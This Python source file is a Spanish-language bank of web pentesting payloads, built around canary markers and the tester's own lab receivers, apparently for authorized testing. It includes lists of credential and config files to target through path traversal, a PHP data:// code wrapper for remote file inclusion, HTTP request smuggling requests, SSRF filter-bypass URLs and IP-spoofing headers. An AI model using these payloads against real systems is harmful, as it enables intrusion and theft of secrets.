"""Bancos de payloads de servidor: básicos, por contexto y avanzados."""

PATT = 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/'
PS = 'https://portswigger.net/web-security/'


def B(nivel, titulo, lenguaje, codigo, nota, fuente):
    return (nivel, titulo, lenguaje, codigo.strip(), nota, fuente)


BANCOS = {
    'ssrf': [
        B('basicos', 'Canary HTTP y DNS propios', 'text', """
https://{RECEPTOR_PROPIO}/ssrf/{NONCE}
http://{NONCE}.{DOMINIO_DNS_PROPIO}/
https://{RECEPTOR_PROPIO}:8443/ssrf/{NONCE}
""", 'Una consulta DNS es una señal de resolución; observar HTTP en el receptor para confirmar la conexión.', PS+'ssrf/blind'),
        B('basicos', 'Formas de loopback en un laboratorio', 'text', """
http://127.0.0.1:{PUERTO_LAB}/canary
http://127.1:{PUERTO_LAB}/canary
http://2130706433:{PUERTO_LAB}/canary
http://0x7f000001:{PUERTO_LAB}/canary
http://[::1]:{PUERTO_LAB}/canary
""", 'Solo con un listener propio. La biblioteca puede aceptar, normalizar o rechazar cada forma.', PATT+'Server%20Side%20Request%20Forgery/README.md'),
        B('contextos', 'Parámetros de URL habituales', 'text', """
?url=https://{RECEPTOR_PROPIO}/ssrf/{NONCE}
?callback=https://{RECEPTOR_PROPIO}/ssrf/{NONCE}
?webhook=https://{RECEPTOR_PROPIO}/ssrf/{NONCE}
?image=https://{RECEPTOR_PROPIO}/imagen/{NONCE}
{"url":"https://{RECEPTOR_PROPIO}/ssrf/{NONCE}"}
""", 'Elegir un parámetro que exista en el flujo real; las rutas de ejemplo no prueban que el backend haga fetch.', PS+'ssrf'),
        B('avanzados', 'Confusión de autoridad y redirección', 'text', """
https://{HOST_PERMITIDO}@{RECEPTOR_PROPIO}/ssrf/{NONCE}
https://{HOST_PERMITIDO}.{RECEPTOR_PROPIO}/ssrf/{NONCE}
https://{RECEPTOR_PROPIO}/ssrf/{NONCE}#{HOST_PERMITIDO}
https://{RECEPTOR_PROPIO}/redirigir?destino=https%3A%2F%2F{SEGUNDO_RECEPTOR_PROPIO}%2Fssrf%2F{NONCE}
""", 'Cada línea es una alternativa. Para la última, configurar en el receptor propio una respuesta 302 hacia el segundo receptor propio; comparar la URL aceptada y cada host contactado.', PATT+'Server%20Side%20Request%20Forgery/README.md'),
        B('avanzados', 'Dirección privada tras re-resolución DNS', 'text', """
{DOMINIO_REBIND_PROPIO} A inicial  = {IP_PUBLICA_PROPIA}
{DOMINIO_REBIND_PROPIO} A posterior = {IP_PRIVADA_LAB_PROPIA}
URL enviada = http://{DOMINIO_REBIND_PROPIO}:{PUERTO_LAB}/canary
""", 'Solo laboratorio propio. Registrar segunda resolución y conexión; el cambio de DNS por sí solo no demuestra bypass.', 'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html'),
    ],
    'deserializacion': [
        B('basicos', 'Firmas de formato para reconocer entradas', 'text', """
Java ObjectInputStream: AC ED 00 05
PHP serialize: O:4:"User":0:{}
Python pickle: 80 04 / 80 05 (según protocolo)
JSON con discriminador: {"@type":"...","value":"..."}
""", 'Son indicadores de formato, no confirmación de ejecución. Usar solo datos propios.', PATT+'Insecure%20Deserialization/README.md'),
        B('basicos', 'PHP: valores serializados inocuos', 'php', """
echo serialize(["marca" => "canary-{NONCE}"]);
echo serialize((object)["marca" => "canary-{NONCE}"]);
""", 'Comparar aceptación de array y objeto en laboratorio; el segundo activa rutas de objeto al deserializar.', PS+'deserialization'),
        B('contextos', 'JSON polimórfico por framework', 'text', """
{"@class":"com.ejemplo.Marca","value":"canary-{NONCE}"}
{"@type":"com.ejemplo.Marca","value":"canary-{NONCE}"}
{"$type":"Ejemplo.Marca, Ensamblado","value":"canary-{NONCE}"}
""", 'Cada campo pertenece a un ecosistema distinto; usar solo si el binder admite tipos aportados por cliente.', PATT+'Insecure%20Deserialization/README.md'),
        B('avanzados', 'Métodos mágicos de PHP en sandbox', 'php', """
class Marca {
  public function __wakeup() { echo "wake-{NONCE}"; }
  public function __destruct() { echo "destroy-{NONCE}"; }
}
$s = serialize(new Marca());
unserialize($s);
""", 'Demuestra el momento de ejecución de callbacks en un programa propio; no es una gadget chain de un producto.', PS+'deserialization/exploiting'),
    ],
    'race-condition': [
        B('basicos', 'Línea base secuencial', 'http', """
POST /api/test/{ID_PROPIO}/redeem HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}

# Repetir una segunda vez, después de observar el estado.
""", 'Confirmar la regla de un solo uso y el efecto persistido antes de probar concurrencia.', PS+'race-conditions'),
        B('basicos', 'Dos operaciones en paralelo', 'bash', r"""
printf '1\n2\n' | xargs -P2 -I{} curl -sS -X POST \
  -H 'Authorization: Bearer {TOKEN_A}' \
  -H 'X-Test-Run: {}' \
  'https://{ORIGEN}/api/test/{ID_PROPIO_2}/redeem'
""", 'Dos requests sobre el mismo objeto propio; el marcador {} fuerza una ejecución por línea de entrada. Verificar el estado final, no solo los códigos HTTP.', PS+'race-conditions'),
        B('contextos', 'Invariantes típicas que requieren dos cuentas propias', 'text', """
Cupón: aplicar una vez → comparar saldo/descuento final.
Inventario simulado: última unidad → confirmar una sola reserva.
Alias único: A y B crean el mismo nombre → confirmar unicidad.
Token de un solo uso: A y B consumen el mismo token propio.
""", 'La respuesta 200 de ambas solicitudes no prueba doble efecto; leer el estado persistido.', PATT+'Race%20Condition/README.md'),
        B('avanzados', 'Grupo HTTP/2 de paquete único', 'text', """
Burp Repeater → dos solicitudes propias en una pestaña de grupo.
Modo: Send group in parallel (HTTP/2 single-packet).
Control: el mismo par en secuencia y sobre otro objeto propio.
""", 'Usar solo en un entorno que permita esta técnica; registrar qué invariante se rompió.', PS+'race-conditions'),
    ],
    'business-logic': [
        B('basicos', 'Bordes de cantidad en sandbox', 'json', """
{"productId":"{PRODUCTO_PROPIO}","quantity":0}
{"productId":"{PRODUCTO_PROPIO}","quantity":-1}
{"productId":"{PRODUCTO_PROPIO}","quantity":1}
""", 'Cada línea es una solicitud alternativa. Comparar importe y stock persistidos; no finalizar pagos reales.', PS+'logic-flaws'),
        B('basicos', 'Campos calculados que deben derivarse en servidor', 'json', """
{"productId":"{PRODUCTO_PROPIO}","quantity":1,"unitPrice":0.01}
{"itemId":"{ITEM_PROPIO}","quantity":1,"totalPrice":0}
{"cartId":"{CARRITO_PROPIO}","discountPercent":100}
""", 'Son alternativas para un modelo de prueba compatible; el eco del JSON no confirma que se haya usado el valor.', PATT+'Business%20Logic%20Errors/README.md'),
        B('contextos', 'Saltos y repeticiones de estado', 'text', """
POST /api/test-orders/{ID_PROPIO}/confirm  (sin paso previo)
POST /api/test-orders/{ID_PROPIO}/refund   (dos veces)
POST /api/test-coupons/{CODIGO_PROPIO}/redeem (en dos objetos propios)
""", 'Registrar estados antes/después y reglas documentadas; cada ruta se adapta al producto real.', PS+'logic-flaws'),
        B('avanzados', 'Invariantes entre moneda, cuenta y workflow', 'json', """
{"fromAccount":"{CUENTA_A}","toAccount":"{CUENTA_B}","amount":1,"currency":"TEST"}
{"itemId":"{ITEM_PROPIO}","currency":"TEST-B","amount":1}
{"orderId":"{ID_PROPIO}","status":"confirmed","paymentStatus":"pending"}
""", 'En un sandbox, comprobar que las transiciones y el valor contable respetan la política del negocio.', PS+'logic-flaws'),
    ],
    'rate-limit-bypass': [
        B('basicos', 'Control de cuota con pocos intentos', 'http', """
POST /api/test-otp/check HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"code":"000000"}
""", 'Usar cuenta propia y un número mínimo permitido de intentos; anotar Retry-After y estado de bloqueo.', PS+'authentication'),
        B('basicos', 'Cabeceras de IP aportadas por cliente', 'text', """
X-Forwarded-For: 192.0.2.10
X-Real-IP: 192.0.2.11
Forwarded: for=192.0.2.12
True-Client-IP: 192.0.2.13
""", 'Probar una por vez; direcciones TEST-NET. El cambio de cabecera no prueba que el contador cambió.', PATT+'Brute%20Force%20Rate%20Limit/README.md'),
        B('contextos', 'Cambios de superficie para la misma acción', 'text', """
POST /api/v1/test-otp/check
POST /api/v2/test-otp/check
POST /graphql  → mutation verifyTestCode(...)
POST /api/test-otp/batch  → dos códigos propios
""", 'Solo comparar superficies que efectivamente ejecuten la misma verificación y estén en alcance.', PATT+'Brute%20Force%20Rate%20Limit/README.md'),
        B('avanzados', 'Dos alias GraphQL con control de presupuesto', 'graphql', """
mutation {
  a: verifyTestCode(code:"000000") { ok }
  b: verifyTestCode(code:"000000") { ok }
}
""", 'Adaptar al esquema si verifyTestCode es una mutación. Dos alias bastan para comprobar si el contador se aplica por campo; no hacer fuerza bruta.', PS+'graphql'),
    ],
    'path-traversal-lfi': [
        B('basicos', 'Traversal mínimo con archivo canary', 'text', r"""
../canary-{NONCE}.txt
../../canary-{NONCE}.txt
..\canary-{NONCE}.txt
..\..\canary-{NONCE}.txt
""", 'Poner el archivo marcador en un directorio propio fuera de la raíz permitida; la profundidad depende del despliegue.', PS+'file-path-traversal'),
        B('basicos', 'Archivos convencionales para lectura acotada', 'text', r"""
/etc/hosts
/etc/hostname
/proc/version
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
""", 'Estos nombres ayudan a identificar sistema; usar un canary propio cuando sea posible y nunca conservar secretos.', PATT+'Directory%20Traversal/README.md'),
        B('basicos', 'Rutas comunes de configuración Linux y aplicaciones', 'text', r"""
/etc/passwd
/etc/hosts
/proc/self/cmdline
/proc/self/environ
/var/www/html/.env
/var/www/html/config.php
/var/www/html/wp-config.php
/etc/nginx/nginx.conf
""", 'Las rutas pueden contener secretos: leer solo lo necesario para una prueba autorizada y redactar la evidencia.', PATT+'Directory%20Traversal/README.md'),
        B('basicos', 'Rutas comunes en Windows e IIS', 'text', r"""
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
""", 'Su existencia depende del despliegue; preferir canary propio y evitar extraer credenciales.', PATT+'Directory%20Traversal/README.md'),
        B('contextos', 'Codificación y normalización', 'text', r"""
..%2f..%2fcanary-{NONCE}.txt
%2e%2e/%2e%2e/canary-{NONCE}.txt
..%252f..%252fcanary-{NONCE}.txt
....//....//canary-{NONCE}.txt
..%5c..%5ccanary-{NONCE}.txt
""", 'Cada línea presupone un orden de decodificación distinto; comparar URL enviada y ruta efectiva.', PATT+'Directory%20Traversal/README.md'),
        B('avanzados', 'Prefijo obligatorio y wrapper PHP', 'text', r"""
/var/www/html/../../../canary-{NONCE}.txt
..;/..;/canary-{NONCE}.txt
php://filter/convert.base64-encode/resource={ARCHIVO_PROPIO}
""", 'El wrapper requiere PHP y un include compatible; base64 de un canary propio evita guardar datos privados.', PATT+'File%20Inclusion/README.md'),
    ],
    'rfi': [
        B('basicos', 'URL remota en parámetros de plantilla', 'text', """
?template=https://{SERVIDOR_PROPIO}/canary-{NONCE}.txt
?page=https://{SERVIDOR_PROPIO}/canary-{NONCE}.txt
?include=https://{SERVIDOR_PROPIO}/canary-{NONCE}.txt
""", 'La callback confirma un fetch; RFI exige que la aplicación incluya o evalúe el contenido remoto.', PATT+'File%20Inclusion/README.md'),
        B('basicos', 'Servidor propio con marcador PHP', 'php', """
<?php echo "RFI-CANARY-{NONCE}"; ?>
""", 'Solo en laboratorio PHP y en un host propio. Distinguir salida calculada de reflejo del código fuente.', PATT+'File%20Inclusion/README.md'),
        B('contextos', 'Esquemas y extensiones', 'text', """
https://{SERVIDOR_PROPIO}/canary-{NONCE}.php
http://{SERVIDOR_PROPIO}/canary-{NONCE}.php
https://{SERVIDOR_PROPIO}/canary-{NONCE}.txt
""", 'Son alternativas HTTP: cambiar solo esquema o extensión por solicitud. El servidor propio debe entregar el código PHP como texto sin ejecutarlo; una callback o ejecución en el servidor emisor no prueba inclusión en el destino.', PATT+'File%20Inclusion/README.md'),
        B('avanzados', 'Wrapper data de PHP en sandbox', 'text', """
data://text/plain;base64,PD9waHAgZWNobyAiUkZJLUNBTkFSWSI7Pz4=
data://text/plain,%3C%3Fphp%20echo%20%22RFI-CANARY%22%3B%3F%3E
""", 'Dos codificaciones del mismo marcador PHP. Si se inserta en un parámetro URL, codificar también el valor exterior. Requiere un include PHP compatible y allow_url_include habilitado; observar RFI-CANARY ejecutado en el destino.', 'https://www.php.net/manual/en/wrappers.data.php'),
        B('avanzados', 'Normalización y ruta impuesta por el backend', 'text', """
https%253A%252F%252F{SERVIDOR_PROPIO}%252Fcanary-{NONCE}.php
https://{SERVIDOR_PROPIO}/canary-{NONCE}.php%00
https://{SERVIDOR_PROPIO}/canary-{NONCE}.php?x=.php
""", 'Doble decodificación y NUL dependen del stack; comprobar en logs del servidor propio qué URL se pidió.', PATT+'File%20Inclusion/README.md'),
    ],
    'file-upload': [
        B('basicos', 'Nombres y extensiones de control', 'text', """
canary.txt
canary.png
canary.svg
canary.jpeg
canary.pdf
canary.json
""", 'Subir contenido inerte a una cuenta propia y registrar nombre final, Content-Type y origen.', PATT+'Upload%20Insecure%20Files/README.md'),
        B('basicos', 'Multipart con tipo declarado distinto del contenido', 'http', """
POST /api/upload HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: multipart/form-data; boundary=canary

--canary
Content-Disposition: form-data; name="file"; filename="canary.txt"
Content-Type: image/png

CANARY-{NONCE}
--canary--
""", 'Las líneas requieren CRLF en una request real; aceptación no equivale a ejecución.', PS+'file-upload'),
        B('contextos', 'Nombres que fuerzan decisiones distintas de parser', 'text', r"""
canary.php.jpg
canary.jpg.php
canary.PhP
canary.php%00.jpg
../canary-{NONCE}.txt
canary.jpg.
""", 'Las variantes con NUL o traversal son principalmente legacy/laboratorio; verificar ruta almacenada.', PATT+'Upload%20Insecure%20Files/README.md'),
        B('avanzados', 'SVG activo con canary local', 'xml', """
<svg xmlns="http://www.w3.org/2000/svg"
     onload="document.documentElement.dataset.canary='CANARY-{NONCE}'">
  <text x="5" y="15">prueba</text>
</svg>
""", 'Abrir como documento SVG propio; cargarlo en <img> no suele ejecutar scripts. Confirmar origen y CSP.', PS+'file-upload'),
        B('avanzados', 'Archivo comprimido con ruta de salida', 'python', """
import zipfile
with zipfile.ZipFile("canary.zip", "w") as z:
    z.writestr("../canary-{NONCE}.txt", "prueba controlada")
""", 'Solo en sandbox: verificar que el extractor rechaza el escape. No sobrescribir archivos preexistentes.', 'https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/'),
    ],
    'request-smuggling': [
        B('basicos', 'Framing normal como control', 'http', """
POST / HTTP/1.1
Host: {LAB_AISLADO}
Content-Length: 0
Connection: close

""", 'Tomar una línea base con la misma conexión antes de probar ambigüedad.', PS+'request-smuggling'),
        B('basicos', 'CL.TE mínimo en laboratorio', 'http', """
POST / HTTP/1.1
Host: {LAB_AISLADO}
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
""", 'Ejemplo esquemático para laboratorio: el cuerpo exacto es 0\\r\\n\\r\\nSMUGGLED (13 octetos). Enviar CRLF reales y desactivar la actualización automática de Content-Length.', PS+'request-smuggling'),
        B('contextos', 'TE.CL mínimo en laboratorio', 'http', """
POST / HTTP/1.1
Host: {LAB_AISLADO}
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

""", 'Ejemplo esquemático para laboratorio: el cuerpo debe terminar en 0\\r\\n\\r\\n; el formateo del bloque elimina ese terminador. Enviar CRLF reales, desactivar actualización automática de Content-Length y confirmar la frontera vista por cada servidor.', PS+'request-smuggling'),
        B('avanzados', 'HTTP/2 downgrade', 'text', """
H2.CL: un Content-Length reenviado no coincide con el cuerpo de frames HTTP/2.
H2.TE: el frontend reenvía Transfer-Encoding a un backend HTTP/1.1.
CL.0: backend interpreta cuerpo declarado como siguiente request.
""", 'No hay bytes universales: registrar traducción real y demostrar desync entre solicitudes propias.', PS+'request-smuggling/advanced'),
    ],
    'http-parameter-pollution': [
        B('basicos', 'Duplicados de query y orden', 'text', """
?id={ID_PROPIO}&id={ID_CONTROLADO_B}
?id={ID_CONTROLADO_B}&id={ID_PROPIO}
?role=user&role=admin
?role=admin&role=user
""", 'Usar objetos de A y B propios; primer/último/lista depende del parser y no es fallo por sí solo.', PATT+'HTTP%20Parameter%20Pollution/README.md'),
        B('basicos', 'Representaciones de array', 'text', """
?id[]={ID_PROPIO}&id[]={ID_CONTROLADO_B}
?id[0]={ID_PROPIO}&id[1]={ID_CONTROLADO_B}
?id={ID_PROPIO},{ID_CONTROLADO_B}
""", 'Solo si el framework acepta ese formato. La autorización debe aplicarse a cada objeto procesado.', PATT+'HTTP%20Parameter%20Pollution/README.md'),
        B('contextos', 'Query frente a body', 'http', """
POST /api/test-object?id={ID_PROPIO} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/x-www-form-urlencoded

id={ID_CONTROLADO_B}
""", 'Comparar con cada ID por separado y comprobar qué valor usó el backend.', PATT+'HTTP%20Parameter%20Pollution/README.md'),
        B('avanzados', 'JSON con clave duplicada', 'text', """
{"id":"{ID_PROPIO}","id":"{ID_CONTROLADO_B}"}
{"role":"user","role":"admin"}
""", 'JSON con claves repetidas tiene semántica dependiente del parser; confirmar discrepancia entre capas y efecto.', PATT+'HTTP%20Parameter%20Pollution/README.md'),
    ],
    'web-cache-poisoning': [
        B('basicos', 'Cabeceras candidatas fuera de la clave', 'text', """
X-Forwarded-Host: {HOST_PROPIO}
X-Forwarded-Scheme: http
X-Forwarded-Proto: http
Origin: https://{HOST_PROPIO}
Accept-Language: es-PE-canary
""", 'Probar una por vez con marcador inocuo. Un reflejo en la primera respuesta no prueba caché compartida.', PS+'web-cache-poisoning'),
        B('basicos', 'Secuencia de control de caché', 'text', """
1. GET /pagina?cb={NONCE} con cabecera candidata y sesión A.
2. GET /pagina?cb={NONCE} sin cabecera y sesión B propia.
3. GET /pagina?cb={OTRO_NONCE} sin cabecera como control.
""", 'Verificar Age, X-Cache, Vary y el contenido servido a B; no usar páginas de terceros.', PS+'web-cache-poisoning'),
        B('contextos', 'Entradas de URL que pueden no entrar en la clave', 'text', """
/pagina?utm_source=canary-{NONCE}
/pagina?cb={NONCE}&lang=es
/pagina?lang=es&cb={NONCE}
""", 'Solo una diferencia por vez; comprobar cómo la caché normaliza o descarta query y orden.', PS+'web-cache-poisoning/exploiting-design-flaws'),
        B('avanzados', 'Host no incluido en la clave', 'http', """
GET /recurso?cb={NONCE} HTTP/1.1
Host: {ORIGEN}
X-Forwarded-Host: {HOST_PROPIO}
""", 'No usar dominio de phishing. Confirmar que una segunda cuenta recibe el canary desde el caché.', PS+'web-cache-poisoning/exploiting-implementation-flaws'),
    ],
    'web-cache-deception': [
        B('basicos', 'Extensiones estáticas sobre una ruta privada propia', 'text', """
/account/profile.css
/account/profile.js
/account/profile.png
/account/profile/{NONCE}.css
""", 'La respuesta debe contener datos de A y luego ser servida desde caché a B; un 200 de SPA no basta.', PS+'web-cache-deception'),
        B('basicos', 'Control de dos sesiones', 'text', """
A: GET /account/profile/{NONCE}.css con su cookie.
B: GET /account/profile/{NONCE}.css con su cookie propia.
Control: GET /account/profile/{OTRO_NONCE}.css con cookie B.
""", 'También se puede repetir anónimo como control adicional. Verificar Age o cabeceras equivalentes y cuerpo privado de A en B antes de reportar.', PS+'web-cache-deception'),
        B('contextos', 'Delimitadores y caracteres codificados', 'text', """
/account/profile;canary.css
/account/profile%23canary.css
/account/profile%3fcanary.css
/account/profile/canary.css
""", 'El origen y la caché pueden separar la ruta en puntos diferentes; observar la ruta efectiva.', PS+'web-cache-deception'),
        B('avanzados', 'Normalización de segmentos', 'text', """
/static/..%2faccount/profile
/assets/..%2faccount/profile
/images/..%2faccount/profile
""", 'Solo si la caché guarda el prefijo estático y el origen decodifica %2f y resuelve .. hasta /account/profile. Cada línea cambia únicamente el prefijo; usar perfil propio.', PS+'web-cache-deception'),
    ],
}
